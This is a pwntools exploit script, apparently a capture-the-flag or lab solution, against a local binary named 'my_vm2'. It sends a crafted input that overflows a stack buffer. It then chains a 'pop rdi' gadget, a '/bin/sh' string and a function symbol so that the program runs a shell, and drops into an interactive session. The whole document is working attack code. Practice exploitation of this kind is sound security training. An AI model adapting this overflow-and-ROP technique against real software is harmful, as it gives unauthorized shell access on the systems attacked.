#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

import sys

# Set up pwntools for the correct architecture
exe = context.binary = ELF(sys.argv[1] or "../ref/bin/my_vm2")


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
b *vuln_function+680
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

pwn_func2 = exe.symbols["pwn_func2"]

rop = ROP(exe)

rop.raw(b"PRINTS ")  # instruction
rop.raw(b"\xFF" * (0x220 - 4))  # override rbp - op1
rop.raw(p32(1))  # i
rop.raw(b"\xFF" * 8)  # override padding
rop.raw(rop.rdi.address)  # ROP gadget => pop rdi; ret
rop.raw(b"/bin/sh\x00")  # executable path
rop.raw(pwn_func2)  # ROP

payload = rop.chain()

io.sendline(payload)
io.sendline(b"EXEC")

io.interactive()
